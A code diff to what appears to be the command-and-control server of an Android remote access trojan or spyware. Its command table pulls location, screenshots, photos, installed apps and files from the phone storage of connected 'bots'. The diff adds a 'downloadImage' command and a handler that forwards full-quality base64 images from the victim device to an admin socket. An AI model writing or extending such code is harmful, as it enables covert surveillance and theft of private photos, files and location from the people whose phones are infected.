@@ -357,6 +357,7 @@ io.on('connection', (socket) => {
                 'getLocation': { command: 'getLocation' },
                 'takeScreenshot': { command: 'takeScreenShot' },
                 'getPhotos': { command: 'getImages' },
+                'downloadImage': { command: 'downloadImage', arg1: params.imagePath },
                 'getFiles': { command: 'fileExplorer', arg1: 'list', arg2: params.path || '/storage/emulated/0' },
                 'downloadFile': { command: 'fileExplorer', arg1: 'download', arg2: params.path },
                 'getInstalledApps': { command: 'getInstalledApps' },
@@ -568,6 +569,16 @@ function setupBotDataHandlers(socket) {
                             uniqueId: socket.botUID,
                             totalImages: data.totalImages,
                             message: data.message
+                        });
+                        break;
+                    
+                    case 'downloadImage':
+                        // Full quality image download response
+                        adminSocket.emit('fullQualityImage', {
+                            uniqueId: socket.botUID,
+                            fileName: data.name,
+                            imageData: data.image64,
+                            imagePath: data.imagePath
                         });
                         break;
                         
